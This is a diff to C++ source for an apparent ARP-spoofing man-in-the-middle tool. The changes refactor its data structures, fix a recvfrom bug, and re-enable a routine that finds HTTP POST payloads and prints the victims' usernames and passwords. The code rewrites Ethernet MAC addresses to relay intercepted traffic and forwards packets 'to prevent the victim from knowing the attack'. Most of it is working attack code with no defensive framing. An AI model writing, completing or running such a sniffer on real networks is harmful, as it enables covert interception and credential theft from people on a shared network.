@@ -1,7 +1,5 @@
 #include "mitm_attack.hpp"
 
-// #define INFO 1
-
 /*
 Modify the source MAC address to the attacker to let the receiver think the packet is from the attacker
 Change the destination MAC address of the packet to the corresponding MAC address in the map
@@ -19,19 +17,20 @@ bool modifyPacket(uint8_t *buffer, std::map<std::vector<uint8_t>, std::vector<ui
     memcpy(eth->h_source, info.src_mac.data(), ETH_ALEN);
 
     // If the destination IP is not in the map, change the destination MAC to the gateway's MAC
+
     if (ip_mac_pairs.find({(uint8_t)(iph->daddr & 0xff), (uint8_t)((iph->daddr >> 8) & 0xff), (uint8_t)((iph->daddr >> 16) & 0xff), (uint8_t)((iph->daddr >> 24) & 0xff)}) == ip_mac_pairs.end()) {
         // Find the MAC address for the gateway IP
-        std::array<uint8_t, 4> gateway_ip_addr = {(uint8_t)(local_info.gateway_ip.sin_addr.s_addr & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 8) & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 16) & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 24) & 0xff)};
-        std::array<uint8_t, 6> &gateway_mac = ip_mac_pairs[gateway_ip_addr];
+        std::vector<uint8_t> gateway_ip_addr = {(uint8_t)(info.gateway_ip.sin_addr.s_addr & 0xff), (uint8_t)((info.gateway_ip.sin_addr.s_addr >> 8) & 0xff), (uint8_t)((info.gateway_ip.sin_addr.s_addr >> 16) & 0xff), (uint8_t)((info.gateway_ip.sin_addr.s_addr >> 24) & 0xff)};
+        std::vector<uint8_t> &gateway_mac = ip_mac_pairs[gateway_ip_addr];
         memcpy(eth->h_dest, gateway_mac.data(), ETH_ALEN);
         modified = true;
     }
     // If the destination MAC is my_mac and the IP is not my IP, change the destination MAC to the IP's MAC
-    if (memcmp(eth->h_dest, local_info.src_mac.data(), ETH_ALEN) != 0 && iph->daddr != local_info.src_ip.sin_addr.s_addr && !modified) {
+    if (memcmp(eth->h_dest, info.src_mac.data(), ETH_ALEN) != 0 && iph->daddr != info.src_ip.sin_addr.s_addr && !modified) {
         // Find the MAC address for the destination IP
-        std::array<uint8_t, 4> dest_ip_addr;
+        std::vector<uint8_t> dest_ip_addr(4);
         memcpy(dest_ip_addr.data(), &iph->daddr, 4);
-        std::array<uint8_t, 6> &dest_mac = ip_mac_pairs[dest_ip_addr];
+        std::vector<uint8_t> &dest_mac = ip_mac_pairs[dest_ip_addr];
         memcpy(eth->h_dest, dest_mac.data(), ETH_ALEN);
         modified = true;
     }
@@ -39,7 +38,7 @@ bool modifyPacket(uint8_t *buffer, std::map<std::vector<uint8_t>, std::vector<ui
 }
 
 // Function to send the large packet
-void sendNonHttpPostPacket(uint8_t *buffer, int bytes, int sd, struct LocalInfo local_info) {
+void sendNonHttpPostPacket(uint8_t *buffer, int bytes, int sd, AccessInfo& info) {
     // Get the payload
     uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
     int payload_length = bytes - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));
@@ -48,7 +47,7 @@ void sendNonHttpPostPacket(uint8_t *buffer, int bytes, int sd, struct LocalInfo 
     int total_sent = 0;     // Total amount of data sent
     while (total_sent < bytes) {
         int to_send = std::min(chunk_size, bytes - total_sent);
-        if (sendto(sd, buffer + total_sent, to_send, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device)) <= 0) {
+        if (sendto(sd, buffer + total_sent, to_send, 0, (struct sockaddr *)&info.device, sizeof(info.device)) < 0) {
             perror("sendto() failed (NonHttpPostPacket)");
             exit(EXIT_FAILURE);
         }
@@ -90,7 +89,7 @@ void receiveHandler(int sockfd, std::map<std::vector<uint8_t>, std::vector<uint8
 
     while (true) {
         int n;
-        if (n = recvfrom(sockfd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len) < 0) {
+        if ((n = recvfrom(sockfd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len)) < 0) {
             perror("recvfrom() failed");
             exit(EXIT_FAILURE);
         }
@@ -110,7 +109,7 @@ void receiveHandler(int sockfd, std::map<std::vector<uint8_t>, std::vector<uint8
 
         // Check if packet is a TCP packet
         if (n < ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr)) {
-            if (sendto(sockfd, buffer, n, 0, (struct sockaddr *)&info.device, sizeof(info.device)) <= 0) {
+            if (sendto(sockfd, buffer, n, 0, (struct sockaddr *)&info.device, sizeof(info.device)) < 0) {
                 perror("sendto() failed (CHECK TCP PACKET)");
                 exit(EXIT_FAILURE);
             }
@@ -121,19 +120,19 @@ void receiveHandler(int sockfd, std::map<std::vector<uint8_t>, std::vector<uint8
         uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
         int payload_length = n - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));
 
-        // // Check if the payload is an HTTP POST packet
-        // const char *http_post = "POST";
+        // Check if the payload is an HTTP POST packet
+        const char *http_post = "POST";
 
         if (payload_length < strlen(http_post) || memcmp(payload, http_post, strlen(http_post)) != 0) {
             sendNonHttpPostPacket(buffer, n, sockfd, info);
             continue;
         }
 
-        // // Print the username and password
-        // printUsernameAndPassword(payload, payload_length);
+        // Print the username and password
+        printUsernameAndPassword(payload, payload_length);
 
         // Send the packet in order to prevent the victim from knowing the attack
-        if (sendto(sockfd, buffer, n, 0, (struct sockaddr *)&info.device, sizeof(info.device)) <= 0) {
+        if (sendto(sockfd, buffer, n, 0, (struct sockaddr *)&info.device, sizeof(info.device)) < 0) {
             perror("sendto() failed");
             exit(EXIT_FAILURE);
         }
@@ -151,7 +150,7 @@ int main(int argc, char **argv) {
     // Submit request for a raw socket descriptor.
     if ((sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
         perror("socket() failed");
-        exit(EXIT_FAILURE);
+        exit(1);
     }
 
     sendARPRequest(sockfd, info);
@@ -176,5 +175,5 @@ int main(int argc, char **argv) {
     // Close socket descriptor.
     close(sockfd);
 
-    return (EXIT_SUCCESS);
+    return 0;
 }
